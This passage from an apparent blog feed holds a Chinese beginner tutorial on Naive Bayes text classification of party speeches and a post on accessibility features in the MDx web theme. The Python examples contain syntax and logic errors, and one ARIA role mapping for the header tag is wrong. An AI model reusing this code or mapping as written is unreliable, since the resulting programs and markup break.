找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 